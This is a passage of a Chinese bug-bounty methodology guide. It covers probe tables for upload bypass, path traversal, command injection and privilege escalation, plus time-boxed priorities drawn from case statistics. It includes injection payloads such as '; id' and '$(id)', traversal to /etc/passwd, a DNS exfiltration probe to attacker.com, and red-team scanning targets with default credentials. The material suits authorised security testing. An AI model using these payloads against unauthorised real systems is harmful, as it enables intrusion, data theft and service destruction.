| 改扩展名 `.php` `.jsp` `.asp` `.phtml` `.jspx` | 黑名单缺失 |
| `.Php` / `.pHp%20` / `.php.` | 大小写 / 空格绕过 |
| `shell.php%00.jpg` | 截断绕过（旧版） |
| `Content-Type: image/jpeg` 但内容是脚本 | MIME 仅靠 Header |
| 文件名加 `../` | 路径校验缺失 |
| 上传后访问目录列表 | 命名规则猜测 |
| 内容含图片头 + 脚本（图片马） | 解析漏洞配合 |

### 3.8 文件读 / 下载 / 删除

| 探针 | 缺失则 |
|------|-------|
| `?file=../../etc/passwd` 各级 | 路径规范化缺失 |
| `?file=/etc/passwd`（绝对路径） | 前缀校验缺失 |
| `?file=file:///etc/passwd` | 协议过滤缺失 |
| 删除接口：`?path=../../web/index.html` | **任意文件删（易遗漏！）** |
| 大小写：`?file=../../ETC/PASSWD` | 黑名单 lower |

### 3.9 命令执行（含 ping / nslookup / 工具类）

| 探针 | 缺失则 |
|------|-------|
| `127.0.0.1; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | 拼接符过滤缺失 |
| `127.0.0.1%0aid` | 换行绕过 |
| `127.0.0.1 -c1 -W1 ; sleep 5` | 时间盲（无回显） |
| `ping ${LDAP}.attacker.com` 看 DNSLog | 外带验证 |
| 命令字 cat / curl 被过滤时换 tac / wget | 关键字过滤 |

### 3.10 认证操作

| 探针 | 缺失则 |
|------|-------|
| 短信验证码爆破（4–6 位数字、无频率限制） | 验证码爆破 |
| 验证码不刷新（同一码用多次） | 验证码可重用 |
| 验证码绑定关系：用 A 手机收到的码改 B 密码 | 验证码与用户解绑 |
| 重置流程跳步骤（直接 GET 第 3 步页面） | 流程跳跃 |
| 改请求体 `username=victim` | 凭证参数可控 |
| 撞库（公开数据库 + 无频率限制） | 撞库 |

详见 `playbooks/logic-flaws.md` 4 大密码重置模式。

### 3.11 越权（独立类，常被错过）

| 探针 | 缺失则 |
|------|-------|
| 水平：账号 A 改 B 资源（同级越权） | IDOR (P1) |
| 垂直：普通用户调用 admin API | 后端鉴权仅看 JWT 而不看 role (P0) |
| Header 越权：`X-User-Role: admin` 注入 | Header 信任 (P0) |
| Cookie 越权：改 Cookie 中 `role` / `userId` | 客户端可控会话 (P0) |
| Method 越权：DELETE 不行就试 OPTIONS / `X-HTTP-Method-Override` | 方法过滤不全 |

---

## 4. "新功能 5 分钟探针套餐"

拿到一个新功能，先做这 5 步（约 5–10 分钟）：

```
1. 抓 1 个完整请求（保留所有 Header / Cookie / Body）
   → 看请求里有什么"看起来重要的字段"

2. 删掉 Authorization / Cookie，重发
   → 看是否还能用（未授权）

3. 改 1 个 ID 字段（数字 +1 / 换 UUID / 换租户）
   → 看是否能拿到他人数据（IDOR）

4. 改 1 个看起来"客户端不该控制"的字段
   （price / role / status / is_admin / amount / userId）
   → 看是否生效（Mass Assignment / 篡改）

5. 加一个 corner case 字段（重复参数 / null / 长字符串 / 数组）
   → 看返回是否变化或报错（信息泄露 / 类型混淆）
```

5 步过完没有发现，再进对应 playbook 深挖。

---

## 5. 控制缺口报告写法

报告里把这些用同一个表格格式呈现，平台审核很喜欢：

```markdown
## 控制缺口分析

| 应有控制 | 在该端点是否生效 | 证据 |
|---------|----------------|------|
| 鉴权 | ✓ 缺 Authorization 返回 401 | （包略） |
| 资源所有权 | ✗ 账号 A 可读 B 数据 | 见 PoC §1 |
| 输入完整性 | ✗ 接受 `is_admin=true` 字段 | 见 PoC §2 |
| 操作审计 | ? 无法从外部判断 | - |

漏洞结论：缺失"资源所有权" + "Mass Assignment 防护"，
组合可导致普通用户提权为 admin。
```

---

## 6. 易遗漏的盲区

> 来自 WooYun + 真实 SRC 报告分析的"高频盲区"

1. **文件删除**——大家只测上传 / 下载，忘了 DELETE。任意文件删可瘫服务（删 `index.html`）。
2. **批量参数**（`ids=1,2,3,...,10000`）——单个 IDOR 受限制时，批量接口往往没限制。
3. **导出范围**（`startDate=2010-01-01`）——把分页放大 / 把日期放回十年前。
4. **OPTIONS / HEAD**——很多鉴权拦截只针对 GET/POST。
5. **二次接口 / 内部接口**——通过抓 mobile app / 微信小程序常发现"PC 没暴露的"接口。
6. **WebSocket / SSE**——文档不写、流量不抓的话很容易漏掉。
7. **GraphQL 深嵌套**——顶层加权限，子字段没加（详见 `playbooks/graphql.md`）。
8. **登出 / 注销 redirect_uri**——OAuth 几乎所有人都忘记白名单 logout。
9. **第三方回调** （short URL / sms / pay 回调）——回调 endpoint 经常无签名。

每次审计花 5 分钟过一遍这 9 个盲区，能挖到不少 P1。

---

## 7. 与 playbook 的衔接

发现某类型缺失控制 → 进入对应 playbook 深挖：

| 缺失控制 | 对应 playbook |
|---------|--------------|
| 鉴权 / 资源所有权 | `playbooks/unauth-access.md`、`playbooks/logic-flaws.md` (越权) |
| URL 白名单 / 协议过滤 | `playbooks/ssrf-cache-host.md` |
| 文件类型 / 路径 | `playbooks/file-upload.md`、`playbooks/path-traversal.md` |
| 命令白名单 / 拼接 | `playbooks/rce.md` |
| 验证码 / 凭证绑定 | `playbooks/logic-flaws.md` |
| 输入验证（SQL / XSS） | `playbooks/sqli.md`、`playbooks/xss.md` |
| 金额 / 幂等 / 并发 | `playbooks/logic-flaws.md`、`playbooks/race-conditions.md` |

---

## SOURCE: 05-srctimebox-priority.md

# SRC 时间盒优先级——基于 22,132 案例统计的高危占比排序

> 视角：黑盒 SRC 猎手在限定时间内（一次众测、一次 SRC 集中刷分、一次 HVV 演练）应该按什么顺序投入时间。
> 配套读物：`01-attack-priority.md`（讲漏洞类型本身值多少钱）+ 本篇（讲在一类漏洞中"挖到 == 高危"的概率）。

---

## 1. 一句话原则

`01-attack-priority.md` 给的是 **"如果挖到值多少"**；
本篇给的是 **"挖一个 == 高危的概率有多大"**。
两者结合 → 时间投入回报率最高的先打。

```
时间盒回报 = 漏洞基线赏金（01 表）  ×  挖到即高危概率（本表）  /  平均探测代价
```

---

## 2. 16 类漏洞的高危占比排名

> 22,132 个真实样本，"高危"=平台/委员会评定为 high 或 critical。

| 排名 | 漏洞类别 | 案例数 | 高危占比 | 领域 | 黑盒探测难度 |
|------|---------|-------|---------|------|------------|
| 1 | **密码重置** | 777 | **88.0%** | 认证 | 中（需走完流程并比对响应） |
| 2 | **任意账号 / 任意登录** | 220 | **86.4%** | 授权 | 低（看登录接口是否要求 password） |
| 3 | **提现** | 59 | **83.1%** | 金融 | 高（需测试账号 + 风控边缘） |
| 4 | **金额篡改** | 176 | **83.0%** | 金融 | 低（改 `amount=0.01` 即知） |
| 5 | **余额篡改** | 113 | **77.9%** | 金融 | 中（需理解账本/积分模型） |
| 6 | **任意用户注册** | 24 | **75.0%** | 授权 | 低（绕过邀请码 / 改邮箱后缀） |
| 7 | **逻辑漏洞（综合）** | 266 | **74.8%** | 逻辑 | 中（流程 + 状态机） |
| 8 | **订单篡改** | 1,227 | **74.2%** | 金融 | 中（改 status / 跳步骤） |
| 9 | **价格篡改** | 70 | **74.3%** | 金融 | 低（改 `price`） |
| 10 | **配置不当** | 1,796 | **72.6%** | 配置 | 低（端口扫 + 默认凭据） |
| 11 | **任意操作** | 40 | **72.5%** | 授权 | 中（需认识"批准/审核"接口） |
| 12 | **支付绕过** | 1,056 | **68.7%** | 金融 | 中（重放回调 / 跳过支付） |
| 13 | **设计缺陷** | 1,391 | **65.3%** | 逻辑 | 高（需理解业务） |
| 14 | **信息泄露** | 4,858 | **64.7%** | 信息 | 低（路径字典 + Wayback） |
| 15 | **越权（IDOR / 横纵向）** | 1,705 | **62.3%** | 授权 | 低（双账号比对） |
| 16 | **弱口令** | 7,513 | **58.2%** | 认证 | 低（爆破，注意限速） |

> 三个最值得注意的反直觉数据：
> 1. **密码重置 88%**——很多人只测"短信码爆破"，忽略了响应回显、绑定缺失、流程跳跃 4 模式。
> 2. **配置不当 72.6%**——端口扫描 + 默认凭据是最低成本的"必中型"工作量。
> 3. **任意账号 86.4%**——比泛 IDOR（62.3%）高 24 个百分点，专门盯"登录无密码、token 可伪造"的接口。

---

## 3. SRC 时间盒打法（4 个模板）

### 模板 A：6 小时快进——找一个能交的高危

```
0:00–0:30  扫端口 + 扫 admin 路径 + 跑默认凭据    （命中 → 配置 72.6% / 弱口令 58.2%）
0:30–1:30  抓主要业务流（注册/登录/找回/下单/退）  → 同时记录所有参数
1:30–2:30  密码重置 4 模式逐一过一遍              （88% 高危）
2:30–4:00  双账号 IDOR 横纵向                    （62.3% 高危，但容易批量出活）
4:00–5:00  支付/订单：改 amount/price/quantity    （74–83% 高危）
5:00–6:00  整理证据 + 写报告 + 脱敏
```

### 模板 B：单日深度——一个目标打透

```
1. 先按"模板 A"过一轮地表层
2. 没出货 → 进 SP/CP/合作方子域、冷门子产品（活动页、营销页、积分商城）
3. 翻 GitHub 找该公司的代码泄露（高频参数已知，搜 `siteId`、`out_trade_no` 等）
4. 翻 Wayback Machine 找下线接口（很多老接口仍在线）
5. APP 抓包：和 Web 比对差异接口（APP 接口往往鉴权更弱）
6. 第三方 SDK：客服 IM / 支付 SDK / 推送 SDK，看是否存在硬编码 secret
```

### 模板 C：HVV 演练——拿权限优先

```
P0 焦点（前 30%）：
  - 扫所有 IP 的 6379/27017/2375/9200/2181 → 命中即拿数据/RCE
  - 扫 7001/8080/8088 + WebLogic / JBoss / Tomcat 默认凭据
  - 扫 Spring Actuator /heapdump、/env

P1 焦点（30–60%）：
  - .git / .svn / wwwroot.rar / *.bak（详见 dictionaries/）
  - Shiro rememberMe 默认 key、Fastjson 1.2.x、Log4Shell

P2 焦点（60–100%）：
  - 业务漏洞（密码重置 / 越权 / 任意账号）
  - GitHub 代码搜
```

### 模板 D：SRC 月度刷分——薅长尾

```
高危占比靠后但案例数大的两个矿：
  - 信息泄露（64.7% × 4,858 案例 = 海量）
  - 弱口令（58.2% × 7,513 案例 = 海量）

策略：
  1. 维护私有路径字典 + 弱口令字典（详见 dictionaries/）
  2. 自动化扫一批新上的子域 / 新业务线
  3. 每天花 30 分钟看 SRC 公告/更新，第一时间扫新增资产
```

---

## 4. 与 `01-attack-priority.md` 的合用矩阵

行：基线赏金等级（01 表）。列：高危占比段。
单元格：实际投入排序。

| 基线 \ 高危占比 | 88% 段（密码重置/任意账号） | 72–83% 段（支付/订单/配置/任意操作） | 58–65% 段（IDOR/弱口令/信息泄露） |
|---|---|---|---|
| **P0（RCE / 任意写）** | — | **🔴 最优先**（配置不当含 RCE、Actuator 泄密钥） | 🟠 信息泄露含数据库密码时升 P0 |
| **P0/P1（鉴权绕过 / 越权 admin）** | 🔴 任意账号 = 立刻报 | 🟠 任意操作 / 任意修改 | 🟡 普通 IDOR |
| **P1（IDOR / 逻辑 / SQLi）** | 🟠 密码重置 → 接管单用户 = P1 | 🟡 价格 0.01 / 订单状态跳 | 🟡 横向 IDOR 单条数据 |
| **P2（XSS / CSRF / 重定向）** | — | — | 🟢 拼链子（XSS + IDOR） |

🔴 立即报 / 🟠 高优先 / 🟡 中等 / 🟢 凑数 / — 不存在该组合

---

## 5. 探针决策树（按时间盒预算）

```
拿到目标 → 还有多少时间？

  ≤ 1h  → 只跑：默认凭据 + Actuator + .git + 弱口令 + 单一 IDOR
  ≤ 6h  → 加：密码重置 4 模式 + 价格篡改 + 双账号 IDOR
  ≤ 1d  → 加：订单状态机 + 验证码爆破 + 任意操作（批准/发布）
  ≤ 1w  → 加：APP 逆向 + 子产品线 + 第三方 SDK + 业务深挖
```

每过完一段时间盒，必须做：
1. 确认已发现项是否能证据闭环 → 不能闭环就别留到后期
2. 评估是否还有"短链高占比"组合可挖
3. 不要陷入"我再花一天就能链 RCE"的执念——按时间盒收手

---

## 6. 反直觉提醒

> **三件最容易被忽视但高危占比最高的事：**

1. **拦响应包看验证码**——很多人只关心拦请求，但 88% 高危占比的密码重置漏洞中，最常见就是响应里直接给了 `verifyCode`。
2. **登录接口看是否真的需要密码**——任意账号 86.4% 高危。看请求体：是否只发 `username` 就能换 token？是否 `password` 字段可空？
3. **批准 / 审核 / 发布接口**——任意操作 72.5% 高危。这些往往是"管理员路径"但鉴权写在前端。

---

## 7. 与 playbook 的对应

| 排名段 | 主要 playbook |
|--------|--------------|
| 1（密码重置） | `playbooks/logic-flaws.md` §3.1 + `oauth-saml-jwt.md` |
| 2/6/11（任意 X） | `playbooks/arbitrary-x-authz.md` |
| 3/4/5/8/9/12（金融类） | `playbooks/logic-flaws.md` §3.4 + `industry/banking-finance.md` |
| 7/13（逻辑/设计） | `playbooks/logic-flaws.md` |
| 10（配置） | `playbooks/unauth-access.md` + `dictionaries/default-credentials-cn.md` |
| 14（信息泄露） | `playbooks/info-disclosure.md` + `dictionaries/chinese-srcfingerprints.md` |
| 15（IDOR） | `playbooks/logic-flaws.md` §3.2 + `playbooks/api-rest.md` |
| 16（弱口令） | `playbooks/unauth-access.md` + `dictionaries/default-credentials-cn.md` |
